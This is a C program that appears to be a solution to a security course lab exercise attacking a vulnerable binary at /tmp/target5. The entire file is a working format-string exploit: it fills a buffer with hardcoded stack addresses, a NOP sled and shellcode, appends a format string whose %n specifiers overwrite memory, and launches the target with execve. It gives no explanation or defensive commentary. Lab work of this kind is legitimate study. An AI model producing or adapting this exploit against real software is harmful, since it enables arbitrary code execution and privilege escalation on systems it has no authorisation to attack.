#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target5"

int main(void)
{
  char *args[3];
  char *env[1];

  char attack[200];
  char *format="%u%u%u%u%33u%n%12582668u%n";
  //char *test1,*test2,*test3,*test4,*test5,*test6;
  int i;
  for(i=0;i<200;i++)
  {
        if(i<(200-strlen(format)))
	{
                if(i>15 && i<(15+sizeof(shellcode)))
  		{
			attack[i]=shellcode[i-16];
		}else{
			attack[i]=0x90;
		}
	}else{
		memcpy(attack+i,format,strlen(format));	
                break;
	}
  }
  //attack[200]='\x00';
  attack[0]=0xac;
  attack[1]=0xfd;
  attack[2]=0xff;
  attack[3]=0xbf;

  attack[8]=0xad;
  attack[9]=0xfd;
  attack[10]=0xff;
  attack[11]=0xbf;
  
  //printf(attack,&test1,&test2,&test3,&test4,&test5,&test6);
  //printf("\n");
  //printf("%x\n",test1);
  //printf("%x\n",test6);
  args[0] = TARGET; args[1] = attack; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
